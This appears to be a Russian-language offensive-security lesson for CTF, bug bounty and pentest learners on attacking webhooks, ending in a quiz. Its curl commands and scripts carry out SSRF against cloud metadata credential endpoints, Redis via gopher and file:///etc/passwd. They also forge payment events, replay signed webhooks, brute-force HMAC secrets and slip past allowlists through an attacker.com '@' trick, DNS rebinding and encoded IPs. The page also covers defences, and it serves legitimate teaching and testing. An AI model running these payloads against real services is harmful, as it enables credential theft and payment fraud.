---
id: web-webhooks
title: "Webhooks: SSRF, signature bypass, replay"
category: web
parent: web-api-security
difficulty: medium
order: 1
tags: [webhooks, ssrf, signature, hmac, replay]
prerequisites: [web-api-security, web-ssrf]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 32
summary: "Атаки на webhooks: SSRF при доставке, обход подписи (HMAC), replay и подделка событий, обход allowlist."
---

Webhook — это HTTP-callback, который сервис отправляет на ваш URL при событии (платёж, push, CI). Атакующему вебхуки интересны с двух сторон: (1) как **SSRF-примитив** (вы указываете URL — сервис делает запрос), и (2) как **цель** (подделка подписи, replay, обход allowlist), чтобы заставить сервис принять поддельное событие. Это ядро темы `web-api-security`; здесь — практика по самым результативным векторам.

## Теория: как работает webhook

Сервис (Stripe, GitHub, платёжка) отправляет `POST` на ваш `callback_url` с телом события и заголовком подписи (HMAC): `X-Hub-Signature-256: sha256=<hmac(body, secret)>`. Ваша сторона проверяет подпись и обрабатывает событие. Точки атаки: URL (SSRF), проверка подписи (слабый HMAC/сравнение), replay (нет nonce/timestamp), allowlist (обход).

## Вектор 1: SSRF через webhook

Если вы задаёте `callback_url`, сервис делает исходящий запрос — классический SSRF:

```bash
curl -s -X POST https://app.example/api/webhook \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

Сервис отправляет туда событие и (иногда) возвращает ответ/ошибку → вы читаете внутренние данные. Целитесь в metadata, внутренние API, Redis (см. `web-ssrf-protocol-smuggling`).

## Вектор 2: обход подписи

- **Пустой/дефолтный секрет.** Многие сервисы/библиотеки имеют дефолтный секрет в примерах; пробуйте `secret`, `test`, `changeme`.
- **Слабое сравнение.** Если проверка `==` (не `hmac.compare_digest`) — возможен timing-атака, но чаще просто нет проверки.
- **Неверный алгоритм.** Принять `sha1` вместо `sha256` или наоборот.
- **Подпись считается от неверного тела** (после парсинга JSON, а не от сырых байт) — можно изменить тело, сохранив подпись.
- **Base64/hex-путаница** в формате подписи.

## Вектор 3: replay

Если нет `timestamp`/`nonce`, перехваченный (или подсмотренный в логах) webhook можно переслать повторно:

```bash
curl -s -X POST https://app.example/webhook \
  -H 'X-Signature: <валидная подпись старого события>' \
  -d '{"event":"payment.success","amount":1000}'
```

Цель — повторно зачислить платёж/бонус. Проверьте, обрабатывает ли сервис повторно тот же `event_id`.

## Вектор 4: обход allowlist

Если URL фильтруется (allowlist домена), обходите через URL-parsing-трюки (см. `web-url-parsing`): `@`, `//`, редиректы, поддомены.

```bash
-d '{"url":"https://trusted.com@attacker.com/hook"}'
```

## Разобранный пример: подделка платежа

Сценарий: платёжный провайдер шлёт webhook `payment.success`; ваша проверка подписи слабая.

Шаг 1 — узнаём формат (по документации/перехвату). Шаг 2 — формируем поддельное событие:

```bash
curl -s -X POST https://shop.example/api/payments/webhook \
  -H 'Content-Type: application/json' \
  -d '{"event":"payment.success","order_id":1234,"amount":99999}'
```

Шаг 3 — если сервис зачислил заказ без проверки подписи — ущерб подтверждён.

## Разобранный пример: SSRF через webhook

```bash
# 1) задаём callback на наш listener и проверяем исходящий запрос
curl -s -X POST https://app.example/api/webhook -d '{"url":"https://YOUR-COLLAB/"}'
# 2) переключаем на внутренний адрес
curl -s -X POST https://app.example/api/webhook -d '{"url":"http://127.0.0.1:6379/"}'
# 3) gopher -> Redis
curl -s -X POST https://app.example/api/webhook -d '{"url":"gopher://127.0.0.1:6379/_INFO"}'
```

## Защиты и их обходы

| Защита | Обход |
|--------|-------|
| HMAC-подпись | дефолтный секрет, неверное тело, алгоритм |
| Timestamp-окно | replay в пределах окна |
| Allowlist URL | `@`, `//`, редиректы |
| Отдельный исходящий хост | `gopher`/`dict`, DNS-rebinding |
| `event_id`-дедуп | коллизия/подмена id |

## Инструменты

- **Burp Collaborator/`interactsh`** — детект SSRF/исходящих.
- **`gopherus`/`ssrfmap`** — эксплуатация SSRF.
- **`curl`** — ручные запросы.
- **`hashcat`** — если нужно вскрыть слабый HMAC-секрет из известной пары.

## Что дальше / decision

1. Можно задать callback URL → SSRF к metadata/внутренним.
2. Есть подпись → проверьте дефолтный секрет/сравнение/тело.
3. Нет timestamp/nonce → replay.
4. Allowlist → URL-parsing обходы.
5. Дальше — связать с платежами/ролями (ущерб) или с внутренней сетью.

## Частые ошибки

- **Не проверить дефолтный секрет.** Часто он из примеров.
- **Забыть про replay.** Отсутствие nonce — реальный баг.
- **Игнорировать тело подписи.** Подпись от распарсенного JSON ≠ от сырых байт.
- **Считать allowlist надёжным.** URL-парсинг ломает его.
- **Ломать прод.** Платежи/бонусы — только с согласия.

## HMAC-подписи: детали и timing-атаки

Большинство провайдеров подписывают webhook HMAC-SHA256. Ошибки реализации — источник багов.

```bash
# корректная проверка подписи на стороне получателя (пример на Python)
import hmac, hashlib
expected = hmac.new(secret, raw_body, hashlib.sha256).hexdigest()
provided = request.headers['X-Signature-256'].split('=')[1]
if not hmac.compare_digest(expected, provided):
    abort(401)
```

Типичные уязвимости:

| Ошибка | Последствие | Тест |
|--------|-------------|------|
| `==` вместо `compare_digest` | timing attack на подпись | замер времени |
| проверка подписи до парсинга, но с изменённым телом | подпись валидна, данные другие | поменять body |
| подпись считается по JSON-пересборке | расхождение порядка ключей | добавить пробелы/ключи |
| секрет = имя приложения/дефолт | подпись подделывается | попробовать словарь секретов |
| подпись опциональна | заголовок можно опустить | убрать заголовок |

```bash
# пробуем известные/дефолтные секреты
for s in webhook secret changeme supersecret; do
  echo -n '{"a":1}' | openssl dgst -sha256 -hmac "$s"
done
```

## SSRF через webhook: metadata и внутренние сервисы

Webhook-URL — это запрос, который делает **сервер**. Значит, это SSRF-примитив. Цели по приоритету:

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://127.0.0.1:8080/admin
http://[::1]:6379/
file:///etc/passwd
gopher://127.0.0.1:6379/_PING
```

```bash
# регистрируем webhook с внутренним адресом
curl -s -X POST https://api.example/webhooks -H 'Authorization: Bearer <t>' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","event":"test"}'
# триггерим событие и читаем, что сервер «отправил»
```

Обходы allowlist: десятичный/восьмеричный IP (`2130706433`), DNS-имя на `127.0.0.1` (nip.io), редирект с разрешённого хоста, DNS rebinding.

## Replay и подмена события

Если подпись валидна, но нет защиты от повторов — можно переиграть событие.

```bash
# 1) перехватываем легитимный webhook (например, «оплата прошла»)
# 2) повторяем его 10 раз
for i in $(seq 1 10); do curl -s -X POST https://app.example/hook \
  -H 'X-Signature: <valid>' --data-binary @hook.json; done
```

Защита — `timestamp` в подписи + окно (например, 5 минут) + идемпотентность по `event_id`. Если окна нет или `event_id` не проверяется — replay подтверждён.

## Каталог провайдеров и их заголовков

| Провайдер | Заголовок подписи | Алгоритм | Особенность |
|-----------|-------------------|----------|-------------|
| Stripe | `Stripe-Signature` | HMAC-SHA256 | timestamp + `v1=` |
| GitHub | `X-Hub-Signature-256` | HMAC-SHA256 | `sha256=` |
| Slack | `X-Slack-Signature` | HMAC-SHA256 | timestamp + `v0=` |
| Shopify | `X-Shopify-Hmac-Sha256` | base64 HMAC | сравнение base64 |
| Twilio | `X-Twilio-Signature` | HMAC-SHA1 | подпись по URL+параметрам |
| PayPal | `PAYPAL-TRANSMISSION-SIG` | RSA | сертификат |

Понимание схемы конкретного провайдера позволяет точно проверить, что именно подписывается (тело? URL? timestamp?) и где можно «доиграть» данные.

## Автоматизация проверки webhook-эндпоинтов

```bash
# перебор секретов для подписи (по словарю)
while read s; do
  sig=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$s" -hex | awk '{print $2}')
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$URL" \
    -H "X-Signature-256: sha256=$sig" --data-binary "$BODY")
  [ "$code" != "401" ] && echo "SECRET=$s -> $code"
done < secrets.txt
```

Для SSRF-части удобно вешать Burp Collaborator/собственный listener и смотреть, какие внутренние адреса реально доступны.

## Что делать дальше / решение

1. **Найдите webhook-конфиг.** Где регистрируется URL, какое событие триггерит отправку.
2. **Проверьте SSRF.** Внутренние адреса, metadata, `file://`, `gopher://`.
3. **Разберите подпись.** Какой заголовок, что подписывается, есть ли timestamp.
4. **Попробуйте секреты.** Дефолты, имя приложения, словарь.
5. **Проверьте replay.** Повтор события, отсутствие окна/идемпотентности.
6. **Зафиксируйте PoC.** URL/событие + наблюдаемый эффект (утечка metadata, повторная оплата).

## Практика и справочники

- **PortSwigger Academy** — SSRF и «Webhook»-сценарии.
- **HackTricks** — «SSRF», «Cloud metadata».
- **PayloadsAllTheThings** — SSRF bypass.
- Документация провайдеров (Stripe/GitHub/Slack) — раздел «Verifying webhooks».

## DNS rebinding и обход allowlist по имени

Если приложение проверяет allowlist по **имени**, а не по разрешённому IP, его обходят через DNS rebinding.

```text
# 1) регистрируем домен, который сначала резолвится в разрешённый IP,
#    а через пару секунд — в 127.0.0.1 (или 169.254.169.254)
# 2) при регистрации webhook проверка проходит (резолвится «хороший» IP)
# 3) когда сервер реально делает запрос — DNS уже указывает на localhost
```

Готовые сервисы: `nip.io`, `sslip.io`, `1u.ms`. Примеры записей:

```text
127.0.0.1.nip.io        -> 127.0.0.1
169.254.169.254.sslip.io -> 169.254.169.254
2130706433               -> 127.0.0.1 (десятичный)
0x7f.0x0.0x0.0x1         -> 127.0.0.1 (hex)
[::ffff:127.0.0.1]       -> 127.0.0.1 (IPv6-mapped)
```

## Сводка обходов allowlist для webhook/SSRF

| Проверка | Обход |
|----------|-------|
| allowlist доменов | редирект с разрешённого домена |
| запрет `127.0.0.1` | `127.1`, `2130706433`, `0x7f000001` |
| запрет localhost | `[::1]`, `localtest.me` |
| запрет внутренних подсетей | DNS rebinding |
| проверка схемы | `gopher://`, `file://`, `dict://` |
| проверка при регистрации | изменить цель после регистрации |

Проверяйте, **в какой момент** валидируется URL: при сохранении или при отправке. Разница — залог большинства байпасов.

## Быстрый чек-лист по webhook

| Шаг | Что проверить | Признак проблемы |
|-----|---------------|------------------|
| 1 | URL принимает внутренние адреса | SSRF |
| 2 | Есть ли заголовок подписи | подпись можно опустить |
| 3 | Что именно подписывается | тело/URL/timestamp |
| 4 | Секрет по умолчанию | словарь проходит |
| 5 | Повтор события | нет окна/идемпотентности |
| 6 | Редирект с разрешённого хоста | обход allowlist |

Шесть строк — это весь базовый аудит webhook-эндпоинта; каждая найденная проблема оформляется отдельным PoC.

## Квиз

```quiz
- question: "Как webhook связан с SSRF?"
  options:
    - "Никак"
    - "Сервис шлёт запрос по URL, который вы контролируете"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "Доставка по произвольному URL = SSRF."
- question: "Как проверяется подлинность webhook?"
  options:
    - "По цвету"
    - "HMAC-подписью в заголовке"
    - "По IP"
    - "По размеру"
  answer: 1
  explanation: "Общий секрет + HMAC тела."
- question: "Что нужно для защиты от replay?"
  options:
    - "Только подпись"
    - "Timestamp/nonce и проверка уникальности события"
    - "TLS"
    - "Cookie"
  answer: 1
  explanation: "Иначе валидное событие повторяется."
- question: "Как обойти allowlist домена webhook?"
  options:
    - "Никак"
    - "Через @-трюк, редирект или DNS rebinding"
    - "Сменить метод"
    - "Увеличить таймаут"
  answer: 1
  explanation: "Парсер/редирект уводят на внутренний хост."
- question: "Чем опасна неполная проверка подписи?"
  options:
    - "Она медленная"
    - "Можно изменить непроверенное поле (amount/order)"
    - "Она шифрует"
    - "Она кеширует"
  answer: 1
  explanation: "Подпись должна покрывать всё тело."
```

## Где пригодится

- **CTF (Web):** задачи на webhook/подпись.
- **Bug bounty:** подделка событий — критичный бизнес-импакт.
- **Пентест:** аудит интеграций.
- **Работа (AppSec):** HMAC всего тела, timestamp/nonce, allowlist + egress-контроль.
